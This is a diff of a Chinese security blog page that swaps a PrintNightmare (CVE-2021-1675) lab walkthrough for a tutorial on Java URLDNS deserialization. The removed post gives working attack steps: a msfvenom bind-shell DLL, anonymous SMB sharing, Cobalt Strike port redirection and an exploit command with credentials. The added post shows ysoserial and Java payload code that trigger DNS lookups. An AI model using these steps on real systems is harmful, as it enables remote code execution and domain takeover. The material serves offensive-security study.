@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="内网渗透篇-CVE-2021-1675 Windows Spooler RCE, 学的越深越发现自己的渺小">
+    <meta name="keywords" content="JAVA反序列化初探-URLDNS, 学的越深越发现自己的渺小">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>内网渗透篇-CVE-2021-1675 Windows Spooler RCE | 学的越深越发现自己的渺小</title>
+    <title>JAVA反序列化初探-URLDNS | 学的越深越发现自己的渺小</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">内网渗透篇-CVE-2021-1675 Windows Spooler RCE</h1>
+                    <h1 class="description center-align post-title">JAVA反序列化初探-URLDNS</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-17
+                    2022-03-20
                 </div>
                 
 
@@ -459,65 +459,113 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Print Spooler是Windows系统中用于管理打印相关事务的服务，虽然微软在公告中将该漏洞标记为Important级别的本地权限提升漏洞，但实际上在域环境中合适的条件下，无需任何用户交互，未经身份验证的远程攻击者就可以利用该漏洞以SYSTEM权限在域控制器上执行任意代码，从而获得整个域的控制权。</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><img src="/images/343.png"></p>
-<pre><code>Kali 攻击机 192.168.80.131
-WIN10-PC 边界服务器 192.168.80.130 | 192.168.88.140
-Server-2016 DC域控 192.168.88.131</code></pre>
-<p><strong>配置kali</strong></p>
-<p>编辑kali的<code>/etc/samba/smb.conf</code>开启匿名访问smb</p>
-<pre><code>[global]
-workgroup = workgroup
-server string = test
-netbios name = MZ
-security = user
-map to guest = Bad User
-smb ports = 445
-log file = /var/log/samba/log.%m
-max log size = 5
+                <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>说到JAVA反序列化漏洞，离不开一个工具⼯<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/">ysoserial</a>。它可以根据自己选择的利⽤链，生成反序列利用数据，然后发送给目标，执行我们输入的命令。</p>
+<p>URLDNS 是ysoserial中⼀个利用链的名字，但其实不能称作“利⽤链”。因为其触发的结果不是命令执⾏，而是⼀次DNS请求。</p>
+<h2 id="Gadget链条"><a href="#Gadget链条" class="headerlink" title="Gadget链条"></a>Gadget链条</h2><p><img src="/images/349.png"></p>
+<pre><code>HashMap.readObject()
+-&gt;HashMap.hash()
+-&gt;URL.hashCode()
+-&gt;URLStreamHandler.hashCode()
+-&gt;URLStreamHandler.getHostAddress()
+-&gt;InetAddree.getByName()</code></pre>
+<p><strong>getByName方法就是发起一次DNS请求</strong></p>
+<p><img src="/images/350.png"></p>
+<h2 id="链条分析"><a href="#链条分析" class="headerlink" title="链条分析"></a>链条分析</h2><p><strong>测试代码</strong></p>
+<pre><code>public class Test &#123;
+        public static void main(String[] args) throws Exception &#123;
+            FileInputStream fileInputStream = new FileInputStream(&quot;D:\\test\\URLDNS\\test.ser&quot;);
+            ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
+            inputStream.readObject();
+            inputStream.close();
+        &#125;
+&#125;</code></pre>
+<p><strong>先用ysoserial生成URLDNS payload的命令</strong></p>
+<p>URLDNS是对应利用链的名称，后面的dnslog地址是对应的参数</p>
+<pre><code>java -jar D:\test\ysoserial-master\target\ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://urldnstest.3jozvu.dnslog.cn&quot; &gt; D:\test\URLDNS\test.ser</code></pre>
+<p><img src="/images/351.png"></p>
+<p><strong>分析ysoserial中URLDNS源码</strong></p>
+<pre><code>public class URLDNS implements ObjectPayload&lt;Object&gt; &#123;
 
-[smb]
-comment = Samba
-browseable = yes
-writeable = yes
-public = yes
-path = /tmp/
-read only = no
-guest ok = yes</code></pre>
-<p><strong>启动smb</strong></p>
-<pre><code>service smbd start</code></pre>
-<p>测试是否成功</p>
-<p><img src="/images/344.png"></p>
-<p><strong>生成dll，因为域控不出网所以生成正向dll，放在/tmp目录下</strong></p>
-<pre><code>msfvenom -p windows/x64/shell_bind_tcp lport=4444 -f dll -o bind.dll</code></pre>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
-<li>获得一个普通域用户账户密码</li>
-<li>域控Spooler服务开启（默认就是打开的）</li>
-</ul>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><code>PortBender</code>工具可以用于端口流量的重定向，工具地址：<code>https://github.com/praetorian-inc/PortBender</code>，将<code>PortBender.cna</code>和<code>PortBender.dll</code>放在同一个目录，并将<code>PortBender.cna</code>导入到<code>Cobalt Strike</code>中。</p>
-<p>当<strong>获取一个<code>SYSTEM</code>权限的<code>beacon</code>之后</strong>，通过<code>upload</code>命令将<code>WinDivert64.sys</code>或者<code>WinDivert32.sys</code>上传到目标主机（根据目标主机的类型），然后执行</p>
-<pre><code>upload /tool/NeiWang/PortBender/WinDivert64.sys
+        public Object getObject(final String url) throws Exception &#123;
 
-PortBender redirect 445 8445
+                URLStreamHandler handler = new SilentURLStreamHandler();
 
-rportfwd 8445 192.168.80.131 445</code></pre>
-<p><img src="/images/345.png"></p>
-<p><img src="/images/346.png"></p>
-<p>将WIN10的445端口全部转发到Kali是445端口上</p>
-<p><strong>启动msf设置监听</strong></p>
-<pre><code>msf6 exploit(multi/handler) &gt; set payload windows/x64/shell_bind_tcp
-msf6 exploit(multi/handler) &gt; set RHOST 192.168.88.131
-msf6 exploit(multi/handler) &gt; run</code></pre>
-<p><strong>下载exp</strong></p>
-<pre><code>git clone https://github.com/cube0x0/CVE-2021-1675.git
-cd CVE-2021-1675</code></pre>
-<p><strong>执行命令</strong></p>
-<pre><code>proxychains python3 CVE-2021-1675.py edu.org/eas11:chen@2020@192.168.88.131 &#39;\\192.168.88.140\smb\bind.dll&#39;</code></pre>
-<p><strong>成功接收到shell</strong></p>
-<p>为啥报错不知道，不过不要紧！！！</p>
-<p><img src="/images/347.png"></p>
-<p><img src="/images/348.png"></p>
-<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>利用成功之后sploor这个服务会自动关闭，也就是说这个漏洞只能利用成功一次。</p>
+                HashMap ht = new HashMap();
+                URL u = new URL(null, url, handler); 
+                ht.put(u, url); 
+
+                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); 
+
+                return ht;
+        &#125;
+
+        public static void main(final String[] args) throws Exception &#123;
+                PayloadRunner.run(URLDNS.class, args);
+        &#125;
+        static class SilentURLStreamHandler extends URLStreamHandler &#123;
+
+                protected URLConnection openConnection(URL u) throws IOException &#123;
+                        return null;
+                &#125;
+
+                protected synchronized InetAddress getHostAddress(URL u) &#123;
+                        return null;
+                &#125;
+        &#125;</code></pre>
+<p>可以看到我们输入的url，就是这边传入的url。然后实例化URL类，并把<code>hashCode</code>值设为-1。然后把URL对象put进<code>hashMap</code>类。最后序列化<code>hashMap</code>对象。但payload里还重写了<code>getHostAddress</code>方法，现在先不说为什么，我们一步步看下去。</p>
+<p><strong>反序列过程分析</strong></p>
+<p>跟进下反序列化过程，因为<code>hashMap</code>类继承了<code>Serializable</code>序列化/反序列化接口，所以可以被序列化/反序列。搜下<code>readObject</code>发现重写了该方法。</p>
+<p><img src="/images/352.png"></p>
+<p>可以看到我们传入的url对象,赋值给了这里的参数key，并调用hash处理key。</p>
+<p><img src="/images/353.png"></p>
+<p>跟进<code>hashMap.hash</code>方法，如果key等于null返回0，不为空则调用key下的hashCode方法，即URL类下的hashCode方法。</p>
+<p><img src="/images/354.png"></p>
+<p>跟进<code>URL.hashCode</code>方法,如果<code>hashCode不为-1</code>,则直接返回hashCode，所以我们需要设置URL的hashCode，让其进入<code>handler.hashCode</code>方法，传入的参数为this,即传入的URL实例。</p>
+<p><img src="/images/355.png"></p>
+<p>跟进<code>URLStreamHandler.hashCode</code>方法，进入<code>getHostAddress</code>方法。可以看出，URL中的handler是<code>transient</code>修饰的，所以在进行序列化的时候，不会将该属性序列化。在反序列化的时候，就不会反序列化的我们重写的handler。</p>
+<p><img src="/images/356.png"></p>
+<p><img src="/images/357.png"></p>
+<p>跟进<code>getHostAddress</code>方法，调用<code>InetAddress.getByName</code>方法，而<code>getByName</code>方法就是发起一次<code>DNS请求</code>。到此就可以结束了。</p>
+<p><img src="/images/358.png"></p>
+<p><strong>接下来上面的为啥payload里要重写<code>getHostAddress</code>方法</strong></p>
+<p>因为在往hashMap中put键值对的时候，也会调用计算key的hash，此时也会请求DNS。这样就会影响判断反序列漏洞是否存在的确定性，所以作者重写了<code>getHostAddress</code>方法直接让其返回空。</p>
+<p><img src="/images/360.png"></p>
+<p><img src="/images/359.png"></p>
+<p>当然重写<code>getHostAddress</code>比较麻烦，从上面链条分析，我们知道只要<code>hashCode</code>的值不为-1,就不会进入<code>handler.hashCode</code>方法。我们可以通过先设置hashCode的值不为-1，在hashMap中put完键值对后。再通过反射修改hashCode的数值。</p>
+<p><strong>payload</strong></p>
+<pre><code>import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.net.URL;
+
+public class Test &#123;
+        public static void main(String[] args) throws Exception &#123;
+            HashMap&lt;URL, Integer&gt; map = new HashMap&lt;&gt;();
+            URL u = new URL(&quot;http://ggg.eftcfb.dnslog.cn/&quot;);
+            Class url = u.getClass();
+            Field hashCodeField = url.getDeclaredField(&quot;hashCode&quot;);//通过反射获取hashCode参数
+            hashCodeField.setAccessible(true);//修改作用域
+            hashCodeField.set(u, 1988);//这里通过反射先将hashCode不设置成-1，否则在put的时候就会发起DNS请求,
+            map.put(u, 1);
+            hashCodeField.set(u, -1);//再通过反射将hashCode设置成-1，使其可以在反序列化过程可以成功触发
+            //序列化
+            FileOutputStream fileOutputStream = new FileOutputStream(&quot;./urldns.ser&quot;);
+            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
+            outputStream.writeObject(map);
+            outputStream.close();
+            fileOutputStream.close();
+            //反序列化
+            FileInputStream fileInputStream = new FileInputStream(&quot;./urldns.ser&quot;);
+            ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
+            inputStream.readObject();
+            inputStream.close();
+        &#125;
+&#125;</code></pre>
+<h2 id="总结和建议"><a href="#总结和建议" class="headerlink" title="总结和建议"></a>总结和建议</h2><p>这应该是JAVA反序列漏洞入门的最简单的链条，一定要认真理解好原理，这样在后面分析像Commons Collection链条才会理解的比较快。</p>
+<p>可以先学学PHP的反序列化，个人感觉比JAVA的简单。一定要打好JAVA的基础再来看代码，本人基础比较不好，看了半天才完全理解。</p>
 
             </div>
             <hr/>
@@ -543,7 +591,7 @@ cd CVE-2021-1675</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://keepaha.com/2022/03/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-CVE-2021-1675-Windows-Spooler-RCE/">http://keepaha.com/2022/03/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-CVE-2021-1675-Windows-Spooler-RCE/</a>
+                    <a href="http://keepaha.com/2022/03/20/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2-URLDNS/">http://keepaha.com/2022/03/20/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2-URLDNS/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -748,9 +796,10 @@ cd CVE-2021-1675</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/03/20/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2-URLDNS/">
                     <div class="card-image">
@@ -768,9 +817,9 @@ cd CVE-2021-1675</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-20
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -779,6 +828,7 @@ cd CVE-2021-1675</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -789,13 +839,13 @@ cd CVE-2021-1675</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BSPN%E5%88%A9%E7%94%A8/">
+                <a href="/2022/03/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-CVE-2021-1675-Windows-Spooler-RCE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="内网渗透篇-域渗透之SPN利用">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="内网渗透篇-CVE-2021-1675 Windows Spooler RCE">
                         
-                        <span class="card-title">内网渗透篇-域渗透之SPN利用</span>
+                        <span class="card-title">内网渗透篇-CVE-2021-1675 Windows Spooler RCE</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -806,7 +856,7 @@ cd CVE-2021-1675</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-17
                             </span>
                         <span class="publish-author">
                             
